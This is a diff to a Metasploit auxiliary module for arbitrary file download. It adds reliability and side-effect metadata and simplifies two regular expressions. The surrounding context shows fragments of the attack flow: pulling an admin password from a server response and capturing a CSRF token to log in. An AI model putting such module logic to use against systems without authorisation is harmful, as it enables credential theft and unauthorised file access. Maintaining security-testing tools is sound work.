@@ -42,7 +42,12 @@ class MetasploitModule < Msf::Auxiliary
         'Actions' => [
           ['Download', { 'Description' => 'Download arbitrary file' }]
         ],
-        'DefaultAction' => 'Download'
+        'DefaultAction' => 'Download',
+        'Notes' => {
+          'Reliability' => [ ],
+          'Stability' => [ CRASH_SAFE ],
+          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ]
+        }
       )
     )
 
@@ -112,7 +117,7 @@ class MetasploitModule < Msf::Auxiliary
       'ctype' => "multipart/form-data; boundary=#{post_data.bound}"
     })
 
-    unless res && (res.code == 200) && res.body[/"data":"([0-9a-f\-]{36})/]
+    unless res && (res.code == 200) && res.body[/"data":"([0-9a-f-]{36})/]
       fail_with(Failure::NoAccess, "#{peer} - Failed to obtain the admin password.")
     end
 
@@ -147,7 +152,7 @@ class MetasploitModule < Msf::Auxiliary
       'cookie' => cookie
     })
 
-    unless res && (res.code == 200) && res.body =~ /var csrfToken = "([0-9a-f\-]{36})";/
+    unless res && (res.code == 200) && res.body =~ /var csrfToken = "([0-9a-f-]{36})";/
       fail_with(Failure::NoAccess, "#{peer} - Failed to authenticate obtain CSRF cookie.")
     end
     csrf = Regexp.last_match(1)
